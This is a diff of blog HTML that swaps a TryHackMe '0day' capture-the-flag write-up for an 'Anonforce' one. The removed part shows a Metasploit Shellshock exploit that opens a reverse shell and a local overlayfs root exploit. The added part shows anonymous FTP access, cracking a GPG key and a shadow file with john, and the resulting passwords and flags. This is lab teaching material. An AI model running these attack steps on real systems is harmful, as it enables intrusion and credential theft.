-</span></span><span class="line"><span class="cl"><span class="o">[</span>msf<span class="o">](</span>Jobs:0 Agents:0<span class="o">)</span> exploit<span class="o">(</span>multi/http/apache_mod_cgi_bash_env_exec<span class="o">)</span> &gt;&gt; <span class="nb">set</span> rhosts 0day.thm
-</span></span><span class="line"><span class="cl"><span class="nv">rhosts</span> <span class="o">=</span>&gt; 0day.thm
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[</span>msf<span class="o">](</span>Jobs:0 Agents:0<span class="o">)</span> exploit<span class="o">(</span>multi/http/apache_mod_cgi_bash_env_exec<span class="o">)</span> &gt;&gt; <span class="nb">set</span> targeturi /cgi-bin/test.cgi
-</span></span><span class="line"><span class="cl"><span class="nv">targeturi</span> <span class="o">=</span>&gt; /cgi-bin/test.cgi
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[</span>msf<span class="o">](</span>Jobs:0 Agents:0<span class="o">)</span> exploit<span class="o">(</span>multi/http/apache_mod_cgi_bash_env_exec<span class="o">)</span> &gt;&gt; show payloads
-</span></span><span class="line"><span class="cl">... results ...
-</span></span><span class="line"><span class="cl">   <span class="m">27</span>  payload/linux/x86/shell/reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Stager
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[</span>msf<span class="o">](</span>Jobs:0 Agents:0<span class="o">)</span> exploit<span class="o">(</span>multi/http/apache_mod_cgi_bash_env_exec<span class="o">)</span> &gt;&gt; <span class="nb">set</span> payload <span class="m">27</span>
-</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">=</span>&gt; linux/x86/shell/reverse_tcp
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[</span>msf<span class="o">](</span>Jobs:0 Agents:0<span class="o">)</span> exploit<span class="o">(</span>multi/http/apache_mod_cgi_bash_env_exec<span class="o">)</span> &gt;&gt; <span class="nb">set</span> lhost 10.8.95.227
-</span></span><span class="line"><span class="cl"><span class="nv">lhost</span> <span class="o">=</span>&gt; 10.8.95.227
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[</span>msf<span class="o">](</span>Jobs:0 Agents:0<span class="o">)</span> exploit<span class="o">(</span>multi/http/apache_mod_cgi_bash_env_exec<span class="o">)</span> &gt;&gt; show options
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Module options <span class="o">(</span>exploit/multi/http/apache_mod_cgi_bash_env_exec<span class="o">)</span>:
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">   Name            Current Setting    Required  Description
-</span></span><span class="line"><span class="cl">   ----            ---------------    --------  -----------
-</span></span><span class="line"><span class="cl">   CMD_MAX_LENGTH  <span class="m">2048</span>               yes       CMD max line length
-</span></span><span class="line"><span class="cl">   CVE             CVE-2014-6271      yes       CVE to check/exploit <span class="o">(</span>Accepted: CVE-2014-6271, CVE-2014-6278<span class="o">)</span>
-</span></span><span class="line"><span class="cl">   HEADER          User-Agent         yes       HTTP header to use
-</span></span><span class="line"><span class="cl">   METHOD          GET                yes       HTTP method to use
-</span></span><span class="line"><span class="cl">   Proxies                            no        A proxy chain of format type:host:port<span class="o">[</span>,type:host:port<span class="o">][</span>...<span class="o">]</span>
-</span></span><span class="line"><span class="cl">   RHOSTS          0day.thm           yes       The target host<span class="o">(</span>s<span class="o">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
-</span></span><span class="line"><span class="cl">   RPATH           /bin               yes       Target PATH <span class="k">for</span> binaries used by the CmdStager
-</span></span><span class="line"><span class="cl">   RPORT           <span class="m">80</span>                 yes       The target port <span class="o">(</span>TCP<span class="o">)</span>
-</span></span><span class="line"><span class="cl">   SSL             <span class="nb">false</span>              no        Negotiate SSL/TLS <span class="k">for</span> outgoing connections
-</span></span><span class="line"><span class="cl">   SSLCert                            no        Path to a custom SSL certificate <span class="o">(</span>default is randomly generated<span class="o">)</span>
-</span></span><span class="line"><span class="cl">   TARGETURI       /cgi-bin/test.cgi  yes       Path to CGI script
-</span></span><span class="line"><span class="cl">   TIMEOUT         <span class="m">5</span>                  yes       HTTP <span class="nb">read</span> response timeout <span class="o">(</span>seconds<span class="o">)</span>
-</span></span><span class="line"><span class="cl">   URIPATH                            no        The URI to use <span class="k">for</span> this exploit <span class="o">(</span>default is random<span class="o">)</span>
-</span></span><span class="line"><span class="cl">   VHOST                              no        HTTP server virtual host
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">   When CMDSTAGER::FLAVOR is one of auto,certutil,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">   Name     Current Setting  Required  Description
-</span></span><span class="line"><span class="cl">   ----     ---------------  --------  -----------
-</span></span><span class="line"><span class="cl">   SRVHOST  0.0.0.0          yes       The <span class="nb">local</span> host or network interface to listen on. This must be an address on the <span class="nb">local</span> machine or 0.0.0.0 to listen on a
-</span></span><span class="line"><span class="cl">                                       ll addresses.
-</span></span><span class="line"><span class="cl">   SRVPORT  <span class="m">8080</span>             yes       The <span class="nb">local</span> port to listen on.
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Payload options <span class="o">(</span>linux/x86/shell/reverse_tcp<span class="o">)</span>:
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">   Name   Current Setting  Required  Description
-</span></span><span class="line"><span class="cl">   ----   ---------------  --------  -----------
-</span></span><span class="line"><span class="cl">   LHOST  10.8.95.227      yes       The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
-</span></span><span class="line"><span class="cl">   LPORT  <span class="m">4444</span>             yes       The listen port
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Exploit target:
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">   Id  Name
-</span></span><span class="line"><span class="cl">   --  ----
-</span></span><span class="line"><span class="cl">   <span class="m">0</span>   Linux x86
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">View the full module info with the info, or info -d command.
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[</span>msf<span class="o">](</span>Jobs:0 Agents:0<span class="o">)</span> exploit<span class="o">(</span>multi/http/apache_mod_cgi_bash_env_exec<span class="o">)</span> &gt;&gt; exploit
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.8.95.227:4444
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Command Stager progress - 100.46% <span class="k">done</span> <span class="o">(</span>1097/1092 bytes<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">36</span> bytes<span class="o">)</span> to 10.10.152.56
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">1</span> opened <span class="o">(</span>10.8.95.227:4444 -&gt; 10.10.152.56:48442<span class="o">)</span> at 2023-06-12 16:32:43 +0530
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">id
-</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
-</span></span><span class="line"><span class="cl">whoami
-</span></span><span class="line"><span class="cl">www-data
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 16.92 seconds
 </span></span></code></pre></td></tr></table>
 </div>
-</div><div class="highlight"><div class="chroma">
+</div><p>Here we can see that FTP is open.</p>
+<p>Login with <code>ftp</code> with <code>anonymous</code> username and empty password.</p>
+<h2 id="user-flag">User Flag</h2>
+<p>In <code>/home/melodias</code> there is a <code>user.txt</code> file. We have to download the file using <code>get</code> command.</p>
+<p>Using <code>get user.txt</code> it will download <code>user.txt</code> file in current directory.</p>
+<p><code>user.txt</code> → <code>606083fd33beb1284fc51f411a706af8</code></p>
+<h2 id="root-flag">Root Flag</h2>
+<p>After surfing through different directories, I found a specific one <code>notread</code> and when you change your directory in <code>notread</code>, you will see 2 files i.e. <code>backup.pgp</code> and <code>private.asc</code>. Now, download both of the files using <code>get</code> command.</p>
+<p>From this article <a href="https://blog.atucom.net/2015/08/cracking-gpg-key-passwords-using-john.html">https://blog.atucom.net/2015/08/cracking-gpg-key-passwords-using-john.html</a> we can get to know how to crack GPG private key using john.</p>
+<p>Firstly, convert it into hash.</p>
+<p><code>└─$ gpg2john private.asc &gt; hash.hash</code></p>
+<p>Then using <code>john</code> we can crack the hash.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">└─$ john --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt hash.hash                
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>gpg, OpenPGP / GnuPG Secret Key <span class="o">[</span>32/64<span class="o">])</span>
+</span></span><span class="line"><span class="cl">Cost <span class="m">1</span> <span class="o">(</span>s2k-count<span class="o">)</span> is <span class="m">65536</span> <span class="k">for</span> all loaded hashes
+</span></span><span class="line"><span class="cl">Cost <span class="m">2</span> <span class="o">(</span><span class="nb">hash</span> algorithm <span class="o">[</span>1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224<span class="o">])</span> is <span class="m">2</span> <span class="k">for</span> all loaded hashes
+</span></span><span class="line"><span class="cl">Cost <span class="m">3</span> <span class="o">(</span>cipher algorithm <span class="o">[</span>1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256<span class="o">])</span> is <span class="m">9</span> <span class="k">for</span> all loaded hashes
+</span></span><span class="line"><span class="cl">Will run <span class="m">3</span> OpenMP threads
+</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
+</span></span><span class="line"><span class="cl">xbox360          <span class="o">(</span>anonforce<span class="o">)</span>     
+</span></span><span class="line"><span class="cl">1g 0:00:00:00 DONE <span class="o">(</span>2024-02-21 20:21<span class="o">)</span> 4.761g/s 4428p/s 4428c/s 4428C/s lawrence..sheena
+</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span class="line"><span class="cl">Session completed. 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The plaintext is <code>xbox360</code>.</p>
+<p>Now, import <code>private.asc</code> in gpg and then decrypt it.</p>
+<div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -2107,40 +1904,77 @@ letmein          (./rsa_private_key)
 </span><span class="lnt">22
 </span><span class="lnt">23
 </span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">shell
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying to find binary <span class="s1">&#39;python&#39;</span> on the target machine
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found python at /usr/bin/python
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using <span class="sb">`</span>python<span class="sb">`</span> to pop up an interactive shell
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying to find binary <span class="s1">&#39;bash&#39;</span> on the target machine
-</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found bash at /bin/bash
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">└─$ gpg --import private.asc 
+</span></span><span class="line"><span class="cl">gpg: /home/kali/.gnupg/trustdb.gpg: trustdb created
+</span></span><span class="line"><span class="cl">gpg: key B92CD1F280AD82C2: public key <span class="s2">&#34;anonforce &lt;melodias@anonforce.nsa&gt;&#34;</span> imported
+</span></span><span class="line"><span class="cl">gpg: key B92CD1F280AD82C2: secret key imported
+</span></span><span class="line"><span class="cl">gpg: key B92CD1F280AD82C2: <span class="s2">&#34;anonforce &lt;melodias@anonforce.nsa&gt;&#34;</span> not changed
+</span></span><span class="line"><span class="cl">gpg: Total number processed: <span class="m">2</span>
+</span></span><span class="line"><span class="cl">gpg:               imported: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">gpg:              unchanged: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">gpg:       secret keys read: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">gpg:   secret keys imported: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">                                                                                                                                                                                                                                            
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">www-data@ubuntu:/usr/lib/cgi-bin$ ls
-</span></span><span class="line"><span class="cl">ls
-</span></span><span class="line"><span class="cl">test.cgi
-</span></span><span class="line"><span class="cl">www-data@ubuntu:/usr/lib/cgi-bin$ <span class="nb">cd</span> /home
-</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /home
-</span></span><span class="line"><span class="cl">www-data@ubuntu:/home$ ls
-</span></span><span class="line"><span class="cl">ls
-</span></span><span class="line"><span class="cl">ryan
-</span></span><span class="line"><span class="cl">www-data@ubuntu:/home$ <span class="nb">cd</span> ryan
-</span></span><span class="line"><span class="cl"><span class="nb">cd</span> ryan
-</span></span><span class="line"><span class="cl">www-data@ubuntu:/home/ryan$ ls
-</span></span><span class="line"><span class="cl">ls
-</span></span><span class="line"><span class="cl">user.txt
-</span></span><span class="line"><span class="cl">www-data@ubuntu:/home/ryan$ cat user.txt
-</span></span><span class="line"><span class="cl">cat user.txt
-</span></span><span class="line"><span class="cl">THM<span class="o">{</span>Sh3llSh0ck_r0ckz<span class="o">}</span>
+</span></span><span class="line"><span class="cl">└─$ gpg --decrypt backup.pgp 
+</span></span><span class="line"><span class="cl">gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
+</span></span><span class="line"><span class="cl">gpg: encrypted with 512-bit ELG key, ID AA6268D1E6612967, created 2019-08-12
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;anonforce &lt;melodias@anonforce.nsa&gt;&#34;</span>
+</span></span><span class="line"><span class="cl">root:<span class="nv">$6$07</span>nYFaYf<span class="nv">$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a</span>.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
+</span></span><span class="line"><span class="cl">daemon:*:17953:0:99999:7:::
+</span></span><span class="line"><span class="cl">bin:*:17953:0:99999:7:::
+</span></span><span class="line"><span class="cl">sys:*:17953:0:99999:7:::
+</span></span><span class="line"><span class="cl">sync:*:17953:0:99999:7:::
+</span></span><span class="line"><span class="cl">games:*:17953:0:99999:7:::
+</span></span><span class="line"><span class="cl">man:*:17953:0:99999:7:::
+</span></span><span class="line"><span class="cl">lp:*:17953:0:99999:7:::
+</span></span><span class="line"><span class="cl">mail:*:17953:0:99999:7:::
+</span></span><span class="line"><span class="cl">news:*:17953:0:99999:7:::
+</span></span><span class="line"><span class="cl">uucp:*:17953:0:99999:7:::
+</span></span><span class="line"><span class="cl">proxy:*:17953:0:99999:7:::
+</span></span><span class="line"><span class="cl">www-data:*:17953:0:99999:7:::
+</span></span><span class="line"><span class="cl">backup:*:17953:0:99999:7:::
+</span></span><span class="line"><span class="cl">list:*:17953:0:99999:7:::
+</span></span><span class="line"><span class="cl">irc:*:17953:0:99999:7:::
+</span></span><span class="line"><span class="cl">gnats:*:17953:0:99999:7:::
+</span></span><span class="line"><span class="cl">nobody:*:17953:0:99999:7:::
+</span></span><span class="line"><span class="cl">systemd-timesync:*:17953:0:99999:7:::
+</span></span><span class="line"><span class="cl">systemd-network:*:17953:0:99999:7:::
+</span></span><span class="line"><span class="cl">systemd-resolve:*:17953:0:99999:7:::
+</span></span><span class="line"><span class="cl">systemd-bus-proxy:*:17953:0:99999:7:::
+</span></span><span class="line"><span class="cl">syslog:*:17953:0:99999:7:::
+</span></span><span class="line"><span class="cl">_apt:*:17953:0:99999:7:::
+</span></span><span class="line"><span class="cl">messagebus:*:18120:0:99999:7:::
+</span></span><span class="line"><span class="cl">uuidd:*:18120:0:99999:7:::
+</span></span><span class="line"><span class="cl">melodias:<span class="nv">$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1</span>:18120:0:99999:7:::
+</span></span><span class="line"><span class="cl">sshd:*:18120:0:99999:7:::
+</span></span><span class="line"><span class="cl">ftp:*:18120:0:99999:7::: 
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="root-flag">root flag</h2>
-<p>After executing <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">linpeas</a>, we got the exploit <a href="https://www.exploit-db.com/exploits/37292">exploit</a>.</p>
-<p>compile exploit using gcc.<br />
-<code>gcc ofs.c -o ofs</code></p>
-<p>Upload to server using <code>python -m http.server</code></p>
-<p>Run binary to get root!!</p>
+</div><p>Copy this shadow file in <code>shadow.txt</code> and the using john we can decrypt the password for root.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -2157,21 +1991,24 @@ letmein          (./rsa_private_key)
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@ubuntu:/tmp$ ./ofs
-</span></span><span class="line"><span class="cl">./ofs
-</span></span><span class="line"><span class="cl">spawning threads
-</span></span><span class="line"><span class="cl">mount <span class="c1">#1</span>
-</span></span><span class="line"><span class="cl">mount <span class="c1">#2</span>
-</span></span><span class="line"><span class="cl">child threads <span class="k">done</span>
-</span></span><span class="line"><span class="cl">/etc/ld.so.preload created
-</span></span><span class="line"><span class="cl">creating shared library
-</span></span><span class="line"><span class="cl">whoami
-</span></span><span class="line"><span class="cl">root
-</span></span><span class="line"><span class="cl">cat /root/root.txt
-</span></span><span class="line"><span class="cl">THM<span class="o">{</span>g00d_j0b_0day_isPleased<span class="o">}</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">└─$ john --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt shadow.txt 
+</span></span><span class="line"><span class="cl">Warning: only loading hashes of <span class="nb">type</span> <span class="s2">&#34;sha512crypt&#34;</span>, but also saw <span class="nb">type</span> <span class="s2">&#34;md5crypt&#34;</span>
+</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--format=md5crypt&#34;</span> option to force loading hashes of that <span class="nb">type</span> instead
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>sha512crypt, crypt<span class="o">(</span>3<span class="o">)</span> <span class="nv">$6</span>$ <span class="o">[</span>SHA512 128/128 SSE2 2x<span class="o">])</span>
+</span></span><span class="line"><span class="cl">Cost <span class="m">1</span> <span class="o">(</span>iteration count<span class="o">)</span> is <span class="m">5000</span> <span class="k">for</span> all loaded hashes
+</span></span><span class="line"><span class="cl">Will run <span class="m">3</span> OpenMP threads
+</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
+</span></span><span class="line"><span class="cl">hikari           <span class="o">(</span>root<span class="o">)</span>     
+</span></span><span class="line"><span class="cl">1g 0:00:00:13 DONE <span class="o">(</span>2024-02-21 20:35<span class="o">)</span> 0.07293g/s 490.1p/s 490.1c/s 490.1C/s oblivion..BITCH
+</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span class="line"><span class="cl">Session completed. 
 </span></span></code></pre></td></tr></table>
 </div>
-</div>
+</div><p>Root password is <code>hikari</code>.</p>
+<p>Using <code>ssh</code> we can login with <code>root</code> and then get the root flag using <code>cat /root/root.txt</code></p>
+<p>Flag: <code>f706456440c7af4187810c31c6cebdce</code></p>
+
     </article>
     
     
@@ -2370,13 +2207,13 @@ letmein          (./rsa_private_key)
     
     
       
-        <a href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fg4nd1v.github.io%2fposts%2ftryhackme-0day%2f" title="Facebook" aria-label="Facebook Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
+        <a href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fg4nd1v.github.io%2fposts%2ftryhackme-anonforce%2f" title="Facebook" aria-label="Facebook Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
           <svg data-name="facebook" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m15.997 3.985h2.191v-3.816c-.378-.052-1.678-.169-3.192-.169-3.159 0-5.323 1.987-5.323 5.639v3.361h-3.486v4.266h3.486v10.734h4.274v-10.733h3.345l.531-4.266h-3.877v-2.939c.001-1.233.333-2.077 2.051-2.077z"/></svg>
         </a>
       
     
       
-        <a href="https://twitter.com/intent/tweet?text=TryHackMe%20Writeup%20-%200day%20Room&url=https%3a%2f%2fg4nd1v.github.io%2fposts%2ftryhackme-0day%2f&hashtags=TryHackMe%2cShellshock%2cHashCracking&via=g4nd1v" title="Twitter" aria-label="Twitter Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
+        <a href="https://twitter.com/intent/tweet?text=TryHackMe%20Writeup%20-%20Anonforce%20Room&url=https%3a%2f%2fg4nd1v.github.io%2fposts%2ftryhackme-anonforce%2f&hashtags=TryHackMe%2cFTP%2cJohn-The-Ripper&via=g4nd1v" title="Twitter" aria-label="Twitter Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
           <svg data-name="twitter" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m21.534 7.113c.976-.693 1.797-1.558 2.466-2.554v-.001c-.893.391-1.843.651-2.835.777 1.02-.609 1.799-1.566 2.165-2.719-.951.567-2.001.967-3.12 1.191-.903-.962-2.19-1.557-3.594-1.557-2.724 0-4.917 2.211-4.917 4.921 0 .39.033.765.114 1.122-4.09-.2-7.71-2.16-10.142-5.147-.424.737-.674 1.58-.674 2.487 0 1.704.877 3.214 2.186 4.089-.791-.015-1.566-.245-2.223-.606v.054c0 2.391 1.705 4.377 3.942 4.835-.401.11-.837.162-1.29.162-.315 0-.633-.018-.931-.084.637 1.948 2.447 3.381 4.597 3.428-1.674 1.309-3.8 2.098-6.101 2.098-.403 0-.79-.018-1.177-.067 2.18 1.405 4.762 2.208 7.548 2.208 8.683 0 14.342-7.244 13.986-14.637z"/></svg>
         </a>
       
@@ -2513,7 +2350,7 @@ letmein          (./rsa_private_key)
     <ul class="related-ul">
         
         <li>
-          <a href="/posts/tryhackme-anonforce/" class="related__link">TryHackMe Writeup - Anonforce Room</a>
+          <a href="/posts/tryhackme-0day/" class="related__link">TryHackMe Writeup - 0day Room</a>
         </li>
         
     </ul>
@@ -2523,14 +2360,14 @@ letmein          (./rsa_private_key)
 <nav class="pagination-single">
   
     
-      <a href="https://g4nd1v.github.io/posts/tryhackme-anonforce/" class="pagination-single__left">
-        <div class="pagination-single__icon">
-          <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M19 11H7.83l4.88-4.88c.39-.39.39-1.03 0-1.42-.39-.39-1.02-.39-1.41 0l-6.59 6.59c-.39.39-.39 1.02 0 1.41l6.59 6.59c.39.39 1.02.39 1.41 0 .39-.39.39-1.02 0-1.41L7.83 13H19c.55 0 1-.45 1-1s-.45-1-1-1z"/></svg>
-        </div>
-        <div class="pagination-single__left-title">TryHackMe Writeup - Anonforce Room</div>      
-      </a>
-    
     <div class="grow"></div>
+    
+      <a href="https://g4nd1v.github.io/posts/tryhackme-0day/" class="pagination-single__right">      
+        <div class="pagination-single__right-title">TryHackMe Writeup - 0day Room</div>
+        <div class="pagination-single__icon">
+          <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M5 13h11.17l-4.88 4.88c-.39.39-.39 1.03 0 1.42.39.39 1.02.39 1.41 0l6.59-6.59c.39-.39.39-1.02 0-1.41l-6.58-6.6c-.39-.39-1.02-.39-1.41 0-.39.39-.39 1.02 0 1.41L16.17 11H5c-.55 0-1 .45-1 1s.45 1 1 1z"/></svg>
+        </div>
+      </a>
     
   
 </nav>
@@ -2888,9 +2725,9 @@ document.addEventListener('DOMContentLoaded', function () {
   <div class="toc " data-dir="ltr" data-folding="true" data-ani="true">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#foothold">Foothold</a></li>
-    <li><a href="#user-flag">user flag</a></li>
-    <li><a href="#root-flag">root flag</a></li>
+    <li><a href="#nmap">Nmap</a></li>
+    <li><a href="#user-flag">User Flag</a></li>
+    <li><a href="#root-flag">Root Flag</a></li>
   </ul>
 </nav>
   </div>
